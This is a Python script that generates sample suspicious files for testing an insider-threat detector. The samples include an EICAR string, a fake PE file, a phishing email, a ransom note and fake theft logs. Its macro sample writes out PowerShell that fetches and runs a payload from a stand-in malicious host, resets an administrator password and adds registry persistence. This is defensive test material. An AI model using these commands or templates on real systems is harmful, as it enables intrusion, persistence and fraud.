#!/usr/bin/env python3
"""
CYBERSENTRY AI - Suspicious Test File Generator
Creates various test files to validate the insider threat detection system

WARNING: These files are SAFE for testing - they contain no actual malware
"""

import os
import random
import hashlib
import zipfile
import io
from pathlib import Path
from datetime import datetime

class SuspiciousFileGenerator:
    """Generate test files that trigger CYBERSENTRY AI detection"""
    
    def __init__(self, output_dir="test_files"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.created_files = []
        
    def generate_all(self):
        """Generate all test files"""
        print("\n" + "="*60)
        print("🔧 CYBERSENTRY AI - Suspicious Test File Generator")
        print("="*60)
        
        # List of all test files to generate
        generators = [
            self.generate_eicar,
            self.generate_disguised_pdf_exe,
            self.generate_high_entropy_file,
            self.generate_macro_document,
            self.generate_ransomware_note,
            self.generate_insider_credentials,
            self.generate_pe_with_suspicious_imports,
            self.generate_zip_bomb,
            self.generate_phishing_email,
            self.generate_data_exfiltration_log
        ]
        
        for generator in generators:
            try:
                generator()
            except Exception as e:
                print(f"⚠️ Error generating {generator.__name__}: {e}")
        
        print("\n" + "="*60)
        print(f"✅ Generated {len(self.created_files)} test files in '{self.output_dir}'")
        print("="*60)
        
        return self.created_files
    
    def generate_eicar(self):
        """EICAR test file - should trigger ALL AV"""
        content = r'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
        filepath = self.output_dir / "eicar_test.com"
        filepath.write_text(content)
        self.created_files.append(("eicar_test.com", "EICAR test - should be flagged as MALICIOUS"))
        print(f"✅ {filepath.name} - EICAR test pattern")
    
    def generate_disguised_pdf_exe(self):
        """PDF disguised as executable - should trigger file type mismatch"""
        # Fake PDF header with executable content
        content = b'%PDF-1.4\n'  # PDF header
        content += b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
        content += b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n'
        content += b'3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << >> /MediaBox [0 0 612 792] >>\nendobj\n'
        # Add suspicious PE-like content
        content += b'MZ'  # DOS header (makes it look like executable)
        content += b'\x90' * 58
        content += b'PE\x00\x00'  # PE signature
        content += b'This is a disguised executable'
        
        filepath = self.output_dir / "invoice_2024.pdf.exe"
        filepath.write_bytes(content)
        self.created_files.append(("invoice_2024.pdf.exe", "PDF with EXE header - should trigger file type mismatch"))
        print(f"✅ {filepath.name} - Disguised PDF (should trigger file type mismatch)")
    
    def generate_high_entropy_file(self):
        """High entropy file - suggests encryption/packing"""
        # Generate high-entropy random bytes
        entropy_bytes = bytes([random.randint(0, 255) for _ in range(50000)])
        filepath = self.output_dir / "encrypted_data.bin"
        filepath.write_bytes(entropy_bytes)
        self.created_files.append(("encrypted_data.bin", f"High entropy ({self.calculate_entropy(entropy_bytes):.2f}) - should trigger entropy detection"))
        print(f"✅ {filepath.name} - High entropy file")
    
    def generate_macro_document(self):
        """Document with suspicious macros"""
        content = """<?xml version="1.0"?>
        <OfficeDocument>
            <Macros>
                <Module name="Module1">
                    <Code>
                        Sub AutoOpen()
                            Shell "powershell -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile $env:temp\\update.exe; Start-Process $env:temp\\update.exe"
                            Shell "cmd.exe /c net user administrator P@ssw0rd123"
                            Shell "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Windows\\Temp\\update.exe /f"
                        End Sub
                    </Code>
                </Module>
            </Macros>
        </OfficeDocument>"""
        
        filepath = self.output_dir / "invoice_with_macros.docm"
        filepath.write_text(content)
        self.created_files.append(("invoice_with_macros.docm", "Document with suspicious macros - should trigger macro detection"))
        print(f"✅ {filepath.name} - Suspicious macros detected")
    
    def generate_ransomware_note(self):
        """Ransomware note pattern"""
        content = """
        ================================================
        !!! YOUR FILES HAVE BEEN ENCRYPTED !!!
        ================================================
        
        All your important documents have been encrypted with AES-256.
        
        To decrypt your files, you must pay 0.5 Bitcoin (BTC) to:
        bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
        
        After payment, email: decrypt@protonmail.com with your wallet ID.
        
        DEADLINE: 72 HOURS
        
        YOUR FILES WILL BE PERMANENTLY LOST IF YOU DO NOT PAY.
        
        ================================================
        DEMO RANSOMWARE NOTE - FOR TESTING ONLY
        ================================================
        """
        
        filepath = self.output_dir / "README_DECRYPT.txt"
        filepath.write_text(content)
        self.created_files.append(("README_DECRYPT.txt", "Ransomware note pattern - should trigger ransomware detection"))
        print(f"✅ {filepath.name} - Ransomware note pattern")
    
    def generate_insider_credentials(self):
        """Simulated insider credential theft log"""
        content = f"""
        [AUDIT LOG - SUSPICIOUS ACTIVITY]
        Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        User: david_machiri (Finance Manager)
        Action: AUTHORIZED_FRAUDULENT_TRANSACTION
        Status: USER_ON_LEAVE
        Amount: KES 1,500,000,000
        Recipient Accounts: 47 external accounts
        
        [Pattern Detected]
        - User credentials used while on leave
        - Abnormal transaction volume
        - Unusual authorization pattern
        - Multiple external beneficiaries
        
        This mimics the Equity Bank insider fraud case where KES 1.5B was stolen.
        """
        
        filepath = self.output_dir / "insider_theft.log"
        filepath.write_text(content)
        self.created_files.append(("insider_theft.log", "Insider credential abuse pattern - should trigger behavior anomaly"))
        print(f"✅ {filepath.name} - Insider theft pattern")
    
    def generate_pe_with_suspicious_imports(self):
        """Fake PE file with suspicious API imports"""
        content = b'MZ'  # DOS header
        content += b'\x90' * 58
        content += b'PE\x00\x00'  # PE signature
        
        # Suspicious section names
        suspicious_sections = [b'.packed', b'.upx', b'.crypt']
        for section in suspicious_sections:
            content += section + b'\x00' * (8 - len(section))
        
        # Suspicious API imports
        suspicious_apis = [
            b'CreateRemoteThread',
            b'VirtualAllocEx',
            b'WriteProcessMemory',
            b'LoadLibraryA',
            b'GetProcAddress',
            b'URLDownloadToFileA',
            b'WinExec',
            b'ShellExecute'
        ]
        
        content += b'\nSUSPICIOUS_IMPORTS:\n'
        for api in suspicious_apis:
            content += api + b'\n'
        
        # Additional suspicious strings
        content += b'\nDEMO_MALWARE_PATTERN'
        content += b'\nCreateProcess'
        content += b'\nRegSetValue'
        
        filepath = self.output_dir / "suspicious_update.exe"
        filepath.write_bytes(content)
        self.created_files.append(("suspicious_update.exe", "PE with suspicious imports - should trigger YARA and import detection"))
        print(f"✅ {filepath.name} - Suspicious imports detected")
    
    def generate_zip_bomb(self):
        """Create a small ZIP that expands significantly"""
        # Create a file with repeated pattern that compresses well
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Write a file that expands massively
            pattern = b'A' * 10000  # 10KB pattern
            content = pattern * 100  # 1MB uncompressed, compresses to ~1KB
            zipf.writestr('data.txt', content)
            
            # Add many small files to trigger file count detection
            for i in range(500):
                zipf.writestr(f'dummy_{i}.txt', b'X' * 100)
        
        filepath = self.output_dir / "archive.zip"
        filepath.write_bytes(zip_buffer.getvalue())
        self.created_files.append(("archive.zip", "ZIP with compression ratio >100:1 - should trigger zip bomb detection"))
        print(f"✅ {filepath.name} - ZIP bomb pattern (500+ files, high compression)")
    
    def generate_phishing_email(self):
        """Simulated phishing email"""
        content = """From: security@your-bank.com
To: victim@company.com
Subject: URGENT: Account Verification Required

Dear Customer,

We detected unusual login activity on your account from a new device in Nairobi.

To secure your account, please verify your identity immediately:

🔗 VERIFY NOW: http://bank-verify-secure.xyz/login

If you don't verify within 24 hours, your account will be permanently locked.

This is an automated security message. Do not reply.

Best regards,
Security Team
Your Bank

[DEMO PHISHING - FOR TESTING ONLY]
"""
        
        filepath = self.output_dir / "urgent_security_alert.eml"
        filepath.write_text(content)
        self.created_files.append(("urgent_security_alert.eml", "Phishing email pattern - should trigger phishing detection"))
        print(f"✅ {filepath.name} - Phishing email pattern")
    
    def generate_data_exfiltration_log(self):
        """Simulated data exfiltration log pattern"""
        content = f"""
        [DATA EXFILTRATION DETECTION]
        Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        User: jane_doe (HR Manager)
        Status: RESIGNATION_DATE = TOMORROW
        Files Downloaded: 1,247
        Total Size: 2.3 GB
        External Destination: Google Drive, USB Drive
        
        [Exfiltrated Files]
        - employee_database.xlsx (45 MB)
        - customer_records.csv (120 MB)
        - salary_data_2024.xlsx (23 MB)
        - confidential_contracts.zip (890 MB)
        - hr_policies.pdf (2 MB)
        
        [Pattern Match]
        - 98% match with data theft before resignation
        - Abnormal download volume: +2,347% from baseline
        - Accessing files outside department: HR accessing engineering data
        
        This mimics the Equity Bank pattern where an employee stole data before resignation.
        """
        
        filepath = self.output_dir / "data_exfiltration.log"
        filepath.write_text(content)
        self.created_files.append(("data_exfiltration.log", "Data exfiltration pattern - should trigger behavior anomaly"))
        print(f"✅ {filepath.name} - Data exfiltration pattern")
    
    def calculate_entropy(self, data):
        """Calculate Shannon entropy of data"""
        if not data:
            return 0
        import math
        from collections import Counter
        
        byte_counts = Counter(data)
        length = len(data)
        entropy = 0
        for count in byte_counts.values():
            probability = count / length
            entropy -= probability * math.log2(probability)
        return round(entropy, 2)


def main():
    """Main execution"""
    generator = SuspiciousFileGenerator("cybersentry_test_files")
    generator.generate_all()
    
    print("\n" + "="*60)
    print("🎯 TESTING INSTRUCTIONS")
    print("="*60)
    print("""
    1. Upload these files to CYBERSENTRY AI
    2. Expected detections:
    
    | File | Expected Verdict | Triggered Detection |
    |------|------------------|---------------------|
    | eicar_test.com | MALICIOUS | YARA rule (EICAR) |
    | invoice_2024.pdf.exe | MALICIOUS | File type mismatch + PE headers |
    | encrypted_data.bin | SUSPICIOUS | High entropy (>7.0) |
    | invoice_with_macros.docm | SUSPICIOUS | Macro detection |
    | README_DECRYPT.txt | SUSPICIOUS | Ransomware pattern |
    | insider_theft.log | SUSPICIOUS | Insider behavior pattern |
    | suspicious_update.exe | MALICIOUS | Suspicious imports + YARA |
    | archive.zip | SUSPICIOUS | ZIP bomb detection |
    | urgent_security_alert.eml | SUSPICIOUS | Phishing pattern |
    | data_exfiltration.log | SUSPICIOUS | Data theft pattern |
    
    3. Watch the agent conversation for explanations
    """)
    print("="*60)

if __name__ == "__main__":
    main()